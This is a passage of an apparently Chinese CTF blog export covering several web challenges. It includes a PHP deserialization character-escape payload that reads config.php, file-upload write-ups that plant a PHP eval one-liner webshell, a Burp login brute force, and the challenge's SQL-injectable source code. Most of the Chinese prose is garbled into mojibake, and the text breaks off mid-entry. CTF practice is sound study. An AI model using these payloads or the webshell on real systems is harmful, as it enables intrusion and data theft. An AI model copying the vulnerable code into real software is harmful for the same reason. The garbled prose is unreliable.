sql_mode=&#x27;strict_all_tables&#x27;&quot;); return $this-&gt;link; &#125; public function select($table, $where, $ret = &#x27;*&#x27;) &#123; $sql = &quot;SELECT $ret FROM $table WHERE $where&quot;; $result = mysql_query($sql, $this-&gt;link); return mysql_fetch_object($result); &#125; public function insert($table, $key_list, $value_list) &#123; $key = implode(&#x27;,&#x27;, $key_list); $value = &#x27;\\&#x27;&#x27; . implode(&#x27;\\&#x27;,\\&#x27;&#x27;, $value_list) . &#x27;\\&#x27;&#x27;; $sql = &quot;INSERT INTO $table ($key) VALUES ($value)&quot;; return mysql_query($sql); &#125; public function update($table, $key, $value, $where) &#123; $sql = &quot;UPDATE $table SET $key = &#x27;$value&#x27; WHERE $where&quot;; return mysql_query($sql); &#125; public function filter($string) &#123; $escape = array(&#x27;\\&#x27;&#x27;, &#x27;\\\\\\\\&#x27;); $escape = &#x27;/&#x27; . implode(&#x27;|&#x27;, $escape) . &#x27;/&#x27;; $string = preg_replace($escape, &#x27;_&#x27;, $string); $safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;); $safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;; return preg_replace($safe, &#x27;hacker&#x27;, $string); &#125; public function __tostring() &#123; return __class__; &#125;&#125;session_start();$user = new user();$user-&gt;connect($config); class.phpä¸­çš„é™åˆ¶ï¼š 1.update_profile ä¸­å¯¹ new_profile ç”¨ filter è¿›è¡Œäº†è¿‡æ»¤ï¼›filterçš„åŠŸèƒ½æ˜¯é€šè¿‡æ­£åˆ™åŒ¹é…æŠŠå­—ç¬¦ä¸²ä¸­å­˜åœ¨çš„&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;æ›¿æ¢æˆ&#39;hacker&#39; config.phpï¼š 1234567&lt;?php $config[&#x27;hostname&#x27;] = &#x27;127.0.0.1&#x27;; $config[&#x27;username&#x27;] = &#x27;root&#x27;; $config[&#x27;password&#x27;] = &#x27;&#x27;; $config[&#x27;database&#x27;] = &#x27;&#x27;; $flag = &#x27;&#x27;;?&gt; æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨config.phpä¸­æœ‰å˜é‡flagï¼Œä½†ä¸ºç©ºï¼Œflagåº”è¯¥åœ¨æœåŠ¡å™¨çš„config.phpæ–‡ä»¶ä¸­ï¼Œå¯ä»¥åˆ©ç”¨çš„æ¼æ´è¯»å–æœåŠ¡å™¨çš„flag register.phpï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?php require_once(&#x27;class.php&#x27;); if($_POST[&#x27;username&#x27;] &amp;&amp; $_POST[&#x27;password&#x27;]) &#123; $username = $_POST[&#x27;username&#x27;]; $password = $_POST[&#x27;password&#x27;]; if(strlen($username) &lt; 3 or strlen($username) &gt; 16) die(&#x27;Invalid user name&#x27;); if(strlen($password) &lt; 3 or strlen($password) &gt; 16) die(&#x27;Invalid password&#x27;); if(!$user-&gt;is_exists($username)) &#123; $user-&gt;register($username, $password); echo &#x27;Register OK!&lt;a href=&quot;index.php&quot;&gt;Please Login&lt;/a&gt;&#x27;; &#125; else &#123; die(&#x27;User name Already Exists&#x27;); &#125; &#125; else &#123;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Login&lt;/title&gt; &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt; &lt;form action=&quot;register.php&quot; method=&quot;post&quot; class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt; &lt;img src=&quot;static/piapiapia.gif&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt; &lt;h3&gt;Register&lt;/h3&gt; &lt;label&gt;Username:&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt; &lt;label&gt;Password:&lt;/label&gt; &lt;input type=&quot;password&quot; name=&quot;password&quot; style=&quot;height:30px&quot; class=&quot;span3&quot;&gt; &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;REGISTER&lt;/button&gt; &lt;/form&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php &#125;?&gt; è¿™ä¸ªå°±æ˜¯æ³¨å†Œé¡µé¢å¯¹åº”çš„æºç ï¼Œæ²¡ä»€ä¹ˆç‰¹åˆ«çš„ update.phpï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;?php require_once(&#x27;class.php&#x27;); if($_SESSION[&#x27;username&#x27;] == null) &#123; die(&#x27;Login First&#x27;); &#125; if($_POST[&#x27;phone&#x27;] &amp;&amp; $_POST[&#x27;email&#x27;] &amp;&amp; $_POST[&#x27;nickname&#x27;] &amp;&amp; $_FILES[&#x27;photo&#x27;]) &#123; $username = $_SESSION[&#x27;username&#x27;]; if(!preg_match(&#x27;/^\\d&#123;11&#125;$/&#x27;, $_POST[&#x27;phone&#x27;])) die(&#x27;Invalid phone&#x27;); if(!preg_match(&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;, $_POST[&#x27;email&#x27;])) die(&#x27;Invalid email&#x27;); if(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10) die(&#x27;Invalid nickname&#x27;); $file = $_FILES[&#x27;photo&#x27;]; if($file[&#x27;size&#x27;] &lt; 5 or $file[&#x27;size&#x27;] &gt; 1000000) die(&#x27;Photo size error&#x27;); move_uploaded_file($file[&#x27;tmp_name&#x27;], &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;])); $profile[&#x27;phone&#x27;] = $_POST[&#x27;phone&#x27;]; $profile[&#x27;email&#x27;] = $_POST[&#x27;email&#x27;]; $profile[&#x27;nickname&#x27;] = $_POST[&#x27;nickname&#x27;]; $profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]); $user-&gt;update_profile($username, serialize($profile)); echo &#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;; &#125; else &#123;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;UPDATE&lt;/title&gt; &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt; &lt;form action=&quot;update.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt; &lt;img src=&quot;static/piapiapia.gif&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt; &lt;h3&gt;Please Update Your Profile&lt;/h3&gt; &lt;label&gt;Phone:&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;phone&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt; &lt;label&gt;Email:&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;email&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt; &lt;label&gt;Nickname:&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;nickname&quot; style=&quot;height:30px&quot; class=&quot;span3&quot;&gt; &lt;label for=&quot;file&quot;&gt;Photo:&lt;/label&gt; &lt;input type=&quot;file&quot; name=&quot;photo&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt; &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;UPDATE&lt;/button&gt; &lt;/form&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php &#125;?&gt; è¿™æ˜¯æ›´æ–°profileçš„æºç ã€‚é™åˆ¶ï¼š 1.ç”µè¯å·ç çš„é•¿åº¦åº”ä¸º11ï¼› 2.nicknameé•¿åº¦å°äº 10 ä½ï¼Œä¸”åªèƒ½ä¸ºå­—æ¯å’Œæ•°å­—ï¼›ï¼ˆæ³¨æ„æ­¤å¤„çš„^ï¼Œè¿™ä¸ªæ­£åˆ™çš„æ„æ€æ˜¯åŒ¹é…é™¤äº†a-zA-Z0-9_ä¹‹å¤–çš„å­—ç¬¦,å› ä¸º ^ ç¬¦å·æ˜¯åœ¨ []é‡Œé¢ï¼Œæ‰€ä»¥æ˜¯éçš„æ„æ€ï¼Œä¸æ˜¯å¼€å§‹çš„æ„æ€ã€‚ï¼‰ 3.å¯¹ä¸Šä¼ çš„ä¿¡æ¯è¿›è¡Œäº†åºåˆ—åŒ–ã€‚ çœ‹åˆ°è¿™é‡Œçš„æ—¶å€™æˆ‘è¿˜ä»¥ä¸ºä¼šä¸ä¼šæ˜¯æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œä½†æ˜¯å‘ç°ä»–æ²¡æœ‰å‘Šè¯‰æˆ‘ä»¬æ–‡ä»¶ä¸Šä¼ åœ°å€ï¼Œå› æ­¤æ— æ³•è¿›ä¸€æ­¥æ“ä½œï¼Œé‚£å°±æ¥ç€å¾€ä¸‹çœ‹å§ profile.phpï¼š 12345678910111213141516171819202122232425262728293031323334353637&lt;?php require_once(&#x27;class.php&#x27;); if($_SESSION[&#x27;username&#x27;] == null) &#123; die(&#x27;Login First&#x27;); &#125; $username = $_SESSION[&#x27;username&#x27;]; $profile=$user-&gt;show_profile($username); if($profile == null) &#123; header(&#x27;Location: update.php&#x27;); &#125; else &#123; $profile = unserialize($profile); $phone = $profile[&#x27;phone&#x27;]; $email = $profile[&#x27;email&#x27;]; $nickname = $profile[&#x27;nickname&#x27;]; $photo = base64_encode(file_get_contents($profile[&#x27;photo&#x27;]));?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Profile&lt;/title&gt; &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt; &lt;img src=&quot;data:image/gif;base64,&lt;?php echo $photo; ?&gt;&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt; &lt;h3&gt;Hi &lt;?php echo $nickname;?&gt;&lt;/h3&gt; &lt;label&gt;Phone: &lt;?php echo $phone;?&gt;&lt;/label&gt; &lt;label&gt;Email: &lt;?php echo $email;?&gt;&lt;/label&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php &#125;?&gt; å…ˆåˆ¤æ–­å‚æ•°profileçš„å€¼æ˜¯å¦ä¸ºç©ºï¼Œä¸ä¸ºç©ºåˆ™ååºåˆ—åŒ–profileï¼Œç„¶åæŠŠå¯¹åº”å€¼å›æ˜¾åˆ°ç½‘é¡µä¸Š æˆ‘ä»¬å…ˆåœ¨æ¥æ¢³ç†ä¸€ä¸‹æ€è·¯ï¼š 1.flagåœ¨config.phpæ–‡ä»¶é‡Œï¼Œä½†æ˜¯æˆ‘ä»¬æ— æ³•ç›´æ¥è·å–flagï¼› 2.update.phpå¯¹ä¸Šä¼ çš„æ•°æ®åšåºåˆ—åŒ–å¤„ç†ï¼› 3.profile.phpä¼šæŠŠupdateçš„æ•°æ®ååºåˆ—åŒ–ç„¶åå›æ˜¾åˆ°ç½‘é¡µä¸Šï¼Œå¹¶ä¸”å‚æ•°photoä¼šä»¥base64çš„æ–¹å¼è¯»å–ä¸Šä¼ å›¾ç‰‡ï¼› 4.nicknameé•¿åº¦å°äº 10 ä½ï¼Œä¸”åªèƒ½ä¸ºå­—æ¯å’Œæ•°å­—ã€‚ æ®æ­¤æˆ‘ä»¬ä¼šæƒ³èƒ½ä¸èƒ½åˆ©ç”¨file_get_contentså‡½æ•°è·å–æœåŠ¡å™¨ç«¯çš„config.phpæ–‡ä»¶ï¼Œè¿™å°±æ¶‰åŠåˆ°äº†ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ã€‚ PHP åœ¨ååºåˆ—åŒ–æ—¶ï¼Œåº•å±‚ä»£ç æ˜¯ä»¥ ; ä½œä¸ºå­—æ®µçš„åˆ†éš”ï¼Œä»¥ &#125; ä½œä¸ºç»“å°¾(å­—ç¬¦ä¸²é™¤å¤–)ï¼Œå¹¶ä¸”æ˜¯æ ¹æ®é•¿åº¦åˆ¤æ–­å†…å®¹çš„ å¦‚ï¼š 1o:1:&#123;s:4:&quot;name&quot;;s:6:&quot;linbei&quot;;&#125; ç¯¡æ”¹nameçš„å€¼ï¼Œåœ¨nameçš„åœ°æ–¹è¾“å…¥name&quot;;s:5:&quot;linmu&quot;;&#125;ï¼Œåˆ™åºåˆ—åŒ–åå˜æˆï¼š 1o:1:&#123;s:19:&quot;name&quot;;s:5:&quot;linmu&quot;;&#125;&quot;;s:6:&quot;linbei&quot;;&#125; æˆ‘ä»¬çœ‹åˆ°ç¬¬ä¸€ä¸ªsçš„å€¼åŸæœ¬æ˜¯4çš„ä½†æ˜¯æ­¤æ—¶å´æ˜¯19ï¼Œé‚£ä¹ˆè¿™æ ·çš„å­—ç¬¦ä¸²ååºåˆ—åŒ–å&quot;;s:6:&quot;linbei&quot;;&#125;è¿˜æ˜¯æ— æ³•é€ƒé€¸ï¼Œä¹Ÿå°±æ˜¯è¯´s:5:&quot;linmu&quot;æ²¡æœ‰é¡¶æ›¿å…¶çš„ä½ç½®ï¼Œä½†æ˜¯å¥½åœ¨class.phpæ–‡ä»¶ä¸­æœ‰filterï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨filterçš„åŠŸèƒ½æŠŠå­—ç¬¦ä¸²ä¸­å­˜åœ¨çš„&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;æ›¿æ¢æˆ&#39;hacker&#39;ï¼Œå…¶ä¸­ç¬¦åˆæ›¿æ¢åé•¿åº¦å¢åŠ çš„åªæœ‰whereã€‚ æˆ‘ä»¬å¸Œæœ›ä¸Šä¼ åæ•°æ®åºåˆ—åŒ–å˜æˆï¼š 1o:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:11:&quot;11111@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:38:&quot;abc&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;s:5:&quot;photo&quot;;s:*:******;&#125; ä¹Ÿå°±æ˜¯æŠŠåŸæœ¬$photoå¯¹åº”åºåˆ—åŒ–çš„å€¼é¡¶æ‰ï¼Œæ¢æˆæˆ‘ä»¬å¸Œæœ›çš„config.phpï¼Œé‚£ä¹ˆæˆ‘ä»¬è¦è®©;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;é€ƒé€¸ ;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;é•¿åº¦ä¸º34ï¼Œå½“å­—ç¬¦ä¸²ä¸­å‡ºç°ä¸€ä¸ªwhereæ—¶ï¼Œæ›¿æ¢åå¢åŠ ä¸€ä¸ªé•¿åº¦ï¼Œå½“å‡ºç°34ä¸ªwhereæ—¶ï¼Œé‚£ä¹ˆå­—ç¬¦ä¸²å¢åŠ 34ä¸ªé•¿åº¦ï¼Œæ­¤æ—¶è¯»å–é‡sä¸å˜ï¼Œå¢åŠ çš„é•¿åº¦å°±æŠŠ;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;é¡¶å‡ºå»äº†ã€‚ ä½†æ˜¯è¿™æ—¶åˆé¢ä¸´ä¸€ä¸ªé—®é¢˜ï¼šnicknameçš„å€¼æœ‰é•¿åº¦é™åˆ¶ï¼Œç”±äºstrlen()å‡½æ•°æ— æ³•åˆ¤åˆ«æ•°ç»„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æŠ“åŒ…æ›´æ”¹nicknameå±æ€§ä¸ºæ•°ç»„ æˆ‘ä»¬è¯•ç€æ„é€ payloadï¼š $phone = 11111111111$email = 11111@qq.com$nickname[] = wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;$photo = éšä¾¿ä¸Šä¼ ä¸€ä¸ªæ»¡è¶³è¦æ±‚çš„æ–‡ä»¶ ä¸Šä¼ æˆåŠŸï¼š base64è§£ç ï¼š spï¼šéƒ¨åˆ†å‡½æ•°çš„æ•°ç»„ç»•è¿‡ï¼š 1234567sha1(Array()) &#x3D; nullereg(pattern,Array()) &#x3D;nullpreg_match(pattern,Array()) &#x3D; falsestrcmp(Array(), â€œabcâ€) &#x3D;nullstrpos(Array(),â€œabcâ€) &#x3D; nullstrlen(Array()) &#x3D; nullmd5(Array()) &#x3D; null å‚è€ƒé“¾æ¥ï¼šhttps://blog.csdn.net/qq_43622442/article/details/105751356 https://blog.csdn.net/qq_43054896/article/details/105586792","tags":[{"name":"ISCC","slug":"ISCC","permalink":"http://example.com/tags/ISCC/"}]},{"title":"iæ˜¥ç§‹","date":"2021-04-29T02:17:47.000Z","path":"2021/04/29/iæ˜¥ç§‹2/","text":"2017ç¬¬äºŒå±Šå¹¿ä¸œçœå¼ºç½‘æ¯çº¿ä¸Šèµ›brokenâ€”â€”ï¼ˆjsfuckï¼‰æ‰“å¼€å®¹å™¨ï¼š ç‚¹å¼€æ–‡ä»¶ï¼š å‘ç°å…¨æ˜¯è¿™æ ·çš„ä¹±ç ï¼ŒæŸ¥é˜…èµ„æ–™å‘ç°è¿™æ˜¯ä¸€ç§jsfuckç¼–ç ï¼šJSFuck å¯ä»¥è®©ä½ åªç”¨ 6 ä¸ªå­—ç¬¦[ ] ( ) ! +æ¥ç¼–å†™ JavaScript ç¨‹åºã€‚ æˆ‘ä»¬èµ‹å€¼è¿™æ®µå­—ç¬¦ä¸²ï¼Œè´´åœ¨æ§åˆ¶å° ç‚¹å‡»&#123;&#125;ç¾åŒ–è¡¨è¾¾å¼ï¼Œè¿è¡Œå‘ç°æŠ¥é”™ï¼Œå¯¹æ¯”ä¸€ä¸‹è¡¨è¾¾å¼ï¼Œå‘ç°ç¬¬ä¸€è¡Œçš„[æ²¡æœ‰å¯¹åº”]åŒ¹é…ï¼Œæˆ‘ä»¬æŠŠå®ƒåŠ ä¸Šï¼Œé¡µé¢å¼¹å‡ºä¸€ä¸ªçª—å£ æˆ‘ä»¬çŒœæµ‹å¼¹å‡ºè¿™ä¸ªçª—å£çš„æºç æˆ–ä¸ºalert(â€˜flag is not hereâ€™)ï¼ŒæŠŠè¿™æ®µæºç jsfuckç¼–ç ï¼Œå‘ç°å…¶é•¿åº¦ä¹Ÿä¸è¿‡26806ï¼Œè€Œä¸Šé¢jsfuckè¡¨è¾¾å¼çš„é•¿åº¦æœ‰127763ï¼Œè¯´æ˜è¿™å…¶ä¸­è¿˜æœ‰åˆ«çš„ä»£ç ï¼Œè€Œflagå¾ˆæœ‰å¯èƒ½è—åœ¨å…¶ä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ¥ä¸‹æ¥å°±æƒ³æ€ä¹ˆèƒ½è·å¾—æºç å‘¢ï¼Ÿ æŸ¥çœ‹äº†wpä»–æ˜¯è¯´æŠŠç»“å°¾çš„()åˆ å»ï¼Œå†è¡¥ä¸ª]ï¼ŒåŒæ—¶æŠŠåˆšå¼€å§‹æ—¶è¡¥çš„]åˆ å» è§£é‡Šæ˜¯è¯¥æ®µä»£ç æœ€å()ä»£è¡¨çš„æ˜¯å‡½æ•°çš„ç»“å°¾ï¼Œæ‰€ä»¥åªè¦æŠŠæœ€åè¿™ä¸ªæ‹¬å·åˆ æ‰å°±ä¸ä¼šå¼¹æ¡†äº† 1","tags":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"iæ˜¥ç§‹","date":"2021-04-19T14:25:33.000Z","path":"2021/04/19/iæ˜¥ç§‹1/","text":"ç¬¬ä¸‰å±Šâ€œç™¾è¶Šæ¯â€ç¦å»ºçœé«˜æ ¡ç½‘ç»œç©ºé—´å®‰å…¨å¤§èµ›ï¼ˆuploadæ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼‰æ‰“å¼€é¢˜ç›®åœ°å€å‘ç°æ˜¯ä¸€é“æ–‡ä»¶ä¸Šä¼ é¢˜ï¼Œå°è¯•ä¸Šä¼ ä¸€ä¸ªshellå†…å®¹ï¼Œjpgåç¼€çš„æ–‡ä»¶ï¼Œå‘ç°ä¸Šä¼ æˆåŠŸï¼Œè¯´æ˜ä¸æ£€æŸ¥æ–‡ä»¶å†…å®¹ å†ä¸Šä¼ ä¸€æ¬¡ï¼ŒburpæŠ“åŒ…ï¼Œä¿®æ”¹åç¼€jpgä¸ºphpï¼Œå‘ç°ä¹Ÿä¸Šä¼ æˆåŠŸ ç”¨èšå‰‘è¿æ¥ æ²¡æœ‰ç›´æ¥ç»™æˆ‘ä»¬flagï¼Œé‚£ä¹ˆå¯èƒ½â€è—â€œèµ·æ¥äº† åœ¨è™šæ‹Ÿç»ˆç«¯ä¸Šå¯»æ‰¾ï¼Œä¹Ÿæ‰¾ä¸åˆ° ç„¶åæˆ‘ä»¥ä¸ºflagè¢«åˆ äº†ï¼Œçœ‹äº†å¤§ä½¬çš„åšå®¢æ‰çŸ¥é“ï¼Œconfigæ–‡ä»¶é‡Œé¢æœ‰å†…å®¹ äºæ˜¯æˆ‘ä»¬åœ¨èšå‰‘çš„ä¸»é¡µé€‰æ‹©æ•°æ®æ“ä½œï¼Œæ·»åŠ æ•°æ®åº“ï¼Œè¿æ¥ç”¨æˆ·å’Œè¿æ¥å¯†ç æ—¶åˆšåˆšé…ç½®æ–‡ä»¶çš„å†…å®¹ å…¶å®æ„Ÿè§‰èƒ½çŒœåˆ°configé‡Œé¢æœ‰ä¸œè¥¿è¿˜æ˜¯è›®ç¥å¥‡çš„ï¼Œå¯èƒ½æ˜¯configæ–‡ä»¶æ˜¯é…ç½®æ–‡ä»¶çš„åŸå› ï¼Œæ‰€ä»¥ä¼šä¸‹æ„è¯†çš„å»é‚£é‡Œæ‰¾çº¿ç´¢ã€‚ â€œç™¾åº¦æ¯â€CTFæ¯”èµ› ä¹æœˆåœºï¼ˆæ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼‰æˆ‘ä»¬å…ˆä¸Šä¼ ä¸€ä¸ªshellå†…å®¹ï¼Œjpgåç¼€çš„æ–‡ä»¶ï¼Œå‘ç°ä¸Šä¼ æˆåŠŸï¼Œè¯´æ˜ä¸æ£€æŸ¥æ–‡ä»¶å†…å®¹ã€‚ç„¶ååœ¨ä¸Šä¼ ä¸Šä¼ ä¸€æ¬¡ï¼Œburpæ‹¦æˆªä¿®æ”¹åç¼€ä¸ºphpï¼Œä¹Ÿä¸Šä¼ æˆåŠŸã€‚ä½†æ˜¯ä»–å¹¶æ²¡æœ‰ç›´æ¥å‘Šè¯‰æˆ‘ä»¬ä»–ä¸Šä¼ çš„ä½ç½®ï¼Œæˆ‘ä»¬æŸ¥çœ‹æºç å¯ä»¥çœ‹åˆ° ç‚¹å‡»è¿›å…¥ç½‘é¡µ æˆ‘ä»¬éƒ½çŸ¥é“ï¼ŒæŒ‰ç†æ¥è¯´è¿™é‡Œä¸åº”è¯¥æ˜¾å‡ºæºç çš„ï¼Œé‚£ä¹ˆå¯¹æ¯”è¯´æ˜è¿™é‡Œè¿‡æ»¤äº†&lt;? å’Œphp æˆ‘ä»¬å¯ä»¥å°è¯•æ¢æ ‡ç­¾ï¼ˆå¦‚&lt;script&gt;ï¼‰æ¥ç»•è¿‡&lt;?è¿‡æ»¤ é€šè¿‡å¤§å°å†™æ¥ç»•è¿‡phpè¿‡æ»¤ æ³•1ï¼šæ„é€ ä¸€ä¸ªå†…å®¹ä¸ºï¼š 1&lt;script language&#x3D;&quot;pHp&quot;&gt;@eval($_POST[&#39;pass&#39;]);&lt;&#x2F;script&gt; åç¼€ä¸ºjspçš„æ–‡ä»¶ï¼Œä¸Šä¼ ï¼Œèšå‰‘è¿æ¥ æ³•2ï¼šhttps://blog.csdn.net/ITmincherry/article/details/102531096 â€œç™¾åº¦æ¯â€CTFæ¯”èµ› 2017 äºŒæœˆåœºï¼ˆæ–‡ä»¶åŒ…å«æ¼æ´ï¼‰æˆ‘ä»¬çœ‹åˆ°è¿™æ˜¯ä¸€é“æ–‡ä»¶åŒ…å«æ¼æ´é¢˜ï¼š æˆ‘ä»¬ä¼šæƒ³åˆ°åˆ©ç”¨PHPçš„è¾“å…¥æµphp://input æˆ‘ä»¬çœ‹åˆ°æœ‰ä¸€ä¸ªæ–‡ä»¶åæ¯”è¾ƒå¥‡ç‰¹ï¼Œç”¨PHP://filterè¯»å–dle345aae.phpæ–‡ä»¶ å†base64è§£ç å¾— â€œç™¾åº¦æ¯â€CTFæ¯”èµ› ä¹æœˆåœºâ€”â€”123æ‰“å¼€å®¹å™¨ï¼Œå‘ç°ä¸€ä¸ªç™»å…¥æ¡†ï¼Œè¿˜ä»¥ä¸ºæ˜¯sqlæ³¨å…¥ï¼Œå°è¯•äº†ä¸€ä¸‹å‘ç°éƒ½æ˜¯æŠ¥é”™ï¼ŒæŸ¥çœ‹æºç ï¼š ç„¶åæŸ¥çœ‹user.phpï¼Œä½†æ˜¯å‘ç°ç½‘é¡µé‡Œé¢ä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼Œæºç ä¹Ÿæ˜¯ äºæ˜¯æˆ‘ç”¨å¾¡å‰‘æ‰«äº†ä¸€ä¸‹ç«¯å£ï¼Œå‘ç°æœ‰ä¸€ä¸ªflag.phpçš„æ–‡ä»¶ï¼Œä½†æ˜¯ç‚¹æ™¯åŒºï¼Œå‘ç°è¢«éª—äº†ï¼Œæ˜¯å‡çš„ã€‚ äºæ˜¯çœ‹äº†å¤§ä½¬çš„æç¤ºï¼Œè¿™é‡Œåº”è¯¥æŸ¥çœ‹user.phpçš„å¤‡ä»½æ–‡ä»¶user.php.bakï¼Œå±äºå¤‡ä»½éšç§æ³„éœ² ä¸‹è½½ä¸‹æ¥ï¼Œé‡Œé¢éƒ½æ˜¯ç”¨æˆ·åï¼Œæ ¹æ®login.phpæºç çš„æç¤ºï¼Œå¯†ç ç”±ç”¨æˆ·å+ç”Ÿæ—¥å¹´ä»½æ„æˆ å°è¯•burpçˆ†ç ´ï¼š è®¾å®šä¸¤ä¸ªå‚æ•°ï¼Œç„¶åæ›´æ”¹æ”»å‡»æ¨¡å¼ä¸ºbattering ramï¼Œå³å¯¹ä¸¤ä¸ªå‚æ•°åŒæ—¶çˆ†ç ´ï¼Œä¸”payloadç›¸åŒ æˆ‘ä»¬çŒœæµ‹è¿™ä¹ˆå¤šç”¨æˆ·é‡Œé¢åº”è¯¥ä¼šæœ‰äººæ˜¯1995å¹´å‡ºç”Ÿçš„ï¼Œç„¶åçˆ†ç ´å‡º ç”¨çˆ†ç ´å‡ºçš„ç”¨æˆ·åå¯†ç ç™»å…¥ï¼Œé¡µé¢ä»€ä¹ˆå†…å®¹ä¹Ÿæ²¡æœ‰ï¼ŒæŸ¥çœ‹æºç å‘ç°ï¼š F12è¿›å…¥å¼€å‘è€…æ¨¡å¼å°†æ³¨é‡Šç¬¦éƒ½åˆ æ‰ï¼Œå¾—åˆ°ä¸€ä¸ªä¸Šä¼ æ¡†ï¼Œä¸Šä¼ ä¸€å¥è¯æœ¨é©¬æ–‡ä»¶ï¼Œ ä¸Šä¼ åç¼€jpgçš„ä¸€å¥è¯æœ¨é©¬ è¿™å°±æœ‰ç‚¹å¥‡æ€ªäº†ï¼Œä¸ºä»€ä¹ˆæ˜æ˜å·²ç»æ˜¯ç™½åå•çš„åç¼€äº†ï¼Œæ–‡ä»¶åè¿˜æ˜¯ä¸åˆæ³• å°è¯•åˆ©ç”¨Apacheçš„åç¼€è§£æ åˆ å»ä¸€å¥è¯æœ¨é©¬ æ‰“å¼€/view.phpç½‘é¡µ ä¼ å‚ï¼š?file=1 è¿‡æ»¤äº†flagï¼Œå°è¯•åŒå†™ç»•è¿‡ SP: burpçš„å‡ ç§æ”»å‡»æ¨¡å¼ï¼šhttps://blog.csdn.net/qq_39101049/article/details/90234669","tags":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf2","date":"2021-04-13T10:42:02.000Z","path":"2021/04/13/buuctf2/","text":"[æå®¢å¤§æŒ‘æˆ˜ 